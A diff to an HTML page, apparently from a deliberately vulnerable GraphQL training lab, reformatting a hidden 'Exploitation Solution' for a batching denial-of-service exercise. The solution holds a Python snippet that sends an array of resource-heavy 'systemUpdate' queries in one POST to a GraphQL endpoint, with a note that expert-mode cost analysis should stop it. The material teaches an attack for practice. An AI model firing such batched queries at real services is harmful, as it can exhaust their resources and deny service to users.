@@ -14,20 +14,19 @@
 <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-batch')">Show</button></h5>
 <div id="sol-dos-batch" style="display:none">
     <pre class="bash">
-    # Beginner mode
+# Beginner mode
 
-    # We chain multiple resource intensive queries in an array and pass it to GraphQL
-    data = [
-    {"query":"query {\n  systemUpdate\n}","variables":[]},
-    {"query":"query {\n  systemUpdate\n}","variables":[]},
-    {"query":"query {\n  systemUpdate\n}","variables":[]}
-    ]
+# We chain multiple resource intensive queries in an array and pass it to GraphQL
+data = [
+{"query":"query {\n  systemUpdate\n}","variables":[]},
+{"query":"query {\n  systemUpdate\n}","variables":[]},
+{"query":"query {\n  systemUpdate\n}","variables":[]}
+]
 
-    requests.post('http://host/graphql', json=data)
+requests.post('http://host/graphql', json=data)
 
-    # Expert mode
+# Expert mode
 
-    # Cost Query Analysis is enabled, which should prevent running batched system updates from going through.
-    </pre>
+Cost Query Analysis is enabled, which should prevent running batched system updates from going through.</pre>
 </div>
 <!-- End -->
